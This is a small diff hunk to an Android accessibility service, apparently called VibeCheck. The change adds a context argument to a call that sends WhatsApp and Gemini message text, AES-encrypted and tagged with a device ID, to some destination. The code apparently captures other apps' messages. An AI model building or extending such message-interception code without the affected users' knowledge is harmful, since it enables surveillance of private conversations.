@@ -91,7 +91,7 @@ public class VibeCheckAccessibilityService extends AccessibilityService {
         try {
             String appName = pkg.equals(WHATSAPP_PKG) ? "whatsapp" : "gemini";
             String[] result = AESEncryptor.encrypt(message);
-            MessageSender.send(deviceId, appName, result[0], result[1], System.currentTimeMillis());
+            MessageSender.send(this, deviceId, appName, result[0], result[1], System.currentTimeMillis());
             Log.d(TAG, "Sent encrypted message from " + appName);
         } catch (Exception e) {
             Log.e(TAG, "Encryption/send failed", e);
